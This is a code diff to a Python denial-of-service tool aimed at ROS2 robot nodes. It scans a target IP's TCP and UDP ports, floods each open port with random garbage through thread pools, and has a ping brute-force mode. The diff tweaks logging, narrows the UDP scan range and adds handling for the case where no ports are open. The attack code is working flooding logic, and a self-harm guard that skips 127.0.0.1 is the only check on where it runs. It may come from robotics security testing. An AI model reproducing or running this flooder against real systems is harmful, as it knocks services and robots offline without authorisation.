@@ -43,11 +43,16 @@ def checkService(node):
         sys.exit()
 
 def dosSendRandomGarbageUDP(ipdest,node,ports,socketObject):
-    print(ports)
+    rslg(node,f'Udp ports {ports}')
     futures = []
-    with concurrent.futures.ThreadPoolExecutor(max_workers=len(ports)) as executor:
-        for port in ports:
-            futures.append(executor.submit(dosSendRandomGarbageAuxUDP,ip=ipdest,node=node,port=port,socketObject=socketObject))
+    lenports = len(ports)
+
+    if (lenports > 0):
+        with concurrent.futures.ThreadPoolExecutor(max_workers=lenports) as executor:
+            for port in ports:
+                futures.append(executor.submit(dosSendRandomGarbageAuxUDP,ip=ipdest,node=node,port=port,socketObject=socketObject))
+    else:
+        rslg(node,f'0 open port detected')
 
 def dosSendRandomGarbageAuxUDP(ip,node,port,socketObject):
     data = (str(random.getrandbits(4096))).encode()
@@ -57,7 +62,7 @@ def dosSendRandomGarbageAuxUDP(ip,node,port,socketObject):
         s.sendto(data, (ip, port))
 
 def dosSendRandomGarbageTCP(ipdest,node,ports,socketObject):
-    print(ports)
+    rslg(node,f'Tcp ports {ports}')
     futures = []
     with concurrent.futures.ThreadPoolExecutor(max_workers=len(ports)) as executor:
         for port in ports:
@@ -69,7 +74,7 @@ def dosSendRandomGarbageAuxTCP(ip,node,port,socketObject):
             data = (str(random.getrandbits(4096))).encode()
             s = socket.socket(socket.AF_INET, socketObject)
             s.connect((ip, port))
-            rslg(node,f'Launching garbage into {ip} tcp port {port}')
+            #rslg(node,f'Launching garbage into {ip} tcp port {port}')
             s.sendall(data)
             s.close()
         except (socket.error, BrokenPipeError) as e:
@@ -126,6 +131,7 @@ def main():
     dosworkers = mydosnode.get_parameter('dos_workers')._value
     dosnodename = mydosnode.get_parameter('dos_node_objective')._value
     portrange = range(1, 65535)  # Scan ports
+    portrangeudp = range(1, 1024)  # Scan ports
 
 
     # In ROS2 there is no mode right now of getting the ip of the node which manages a node. so we are going to take a parameter to get the ip
@@ -172,7 +178,7 @@ def main():
                 # Too powerful. We avoid to kill ourselves by mistake
                 if ipobjectiveParam != '127.0.0.1':
                     rslg(mydosnode,'Attacking udp ports')
-                    dosSendRandomGarbageUDP(ipobjectiveParam,mydosnode,scan_udp_ports(ipobjectiveParam,portrange),socket.SOCK_DGRAM)
+                    dosSendRandomGarbageUDP(ipobjectiveParam,mydosnode,scan_udp_ports(ipobjectiveParam,portrangeudp),socket.SOCK_DGRAM)
         else:
             if dostype == 'dos_ping_bruteforce':
                 rslg(mydosnode,f'Bruteforcing w {dosworkers}')
